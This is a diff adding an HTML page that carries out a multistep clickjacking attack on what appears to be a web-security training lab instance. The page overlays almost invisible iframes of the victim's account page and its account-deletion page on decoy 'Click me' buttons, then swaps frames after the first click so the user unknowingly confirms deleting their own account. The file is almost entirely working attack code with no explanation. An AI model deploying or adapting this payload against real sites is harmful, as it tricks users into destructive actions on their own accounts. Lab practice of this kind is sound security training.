@@ -1,0 +1,62 @@
+<style>
+    iframe {
+        position: relative;
+        width: 700px;
+        height: 700px;
+        opacity: 0.01; /* Increased opacity for better visibility */
+        z-index: 3;
+        display: block; /* Ensures it starts as a block element */
+        margin: 20px auto; /* Center the iframe horizontally */
+    }
+
+    .first {
+        position: absolute;
+        top: 500px; /* Adjusted positioning */
+        left: 400px; /* Adjusted positioning */
+        z-index: 1;
+        background-color: red;
+        padding: 15px; /* Adjusted padding */
+        color: white;
+        cursor: pointer;
+        font-size: 16px; /* Added font-size for better readability */
+    }
+
+    .second {
+        position: absolute;
+        top: 290px; /* Adjusted positioning */
+        left: 550px; /* Adjusted positioning */
+        z-index: 2;
+        background-color: blue;
+        padding: 15px; /* Adjusted padding */
+        color: white;
+        cursor: pointer;
+        font-size: 16px; /* Added font-size for better readability */
+        display: none; /* Initially hide the second div */
+    }
+</style>
+
+<button class="first">Click me first</button>
+<button class="second">Click me next</button>
+
+<iframe id="first-frame" src="https://0a7c007803f3ad1b849397ce00ff003f.web-security-academy.net/my-account" sandbox="allow-forms"></iframe>
+
+<iframe id="second-frame" src="https://0a7c007803f3ad1b849397ce00ff003f.web-security-academy.net/my-account/delete" sandbox="allow-forms" style="display: none;"></iframe>
+
+<script>
+    // Get references to elements
+    const firstFrame = document.getElementById('first-frame');
+    const secondFrame = document.getElementById('second-frame');
+    const firstDiv = document.querySelector('.first');
+    const secondDiv = document.querySelector('.second');
+
+    // Event listener for the first div
+    firstDiv.addEventListener('click', () => {
+        // Hide the first frame and div
+        firstFrame.style.display = 'none';
+        firstDiv.style.display = 'none';
+
+        // Show the second frame and div
+        secondFrame.style.display = 'block';
+        secondDiv.style.display = 'block';
+    });
+</script>
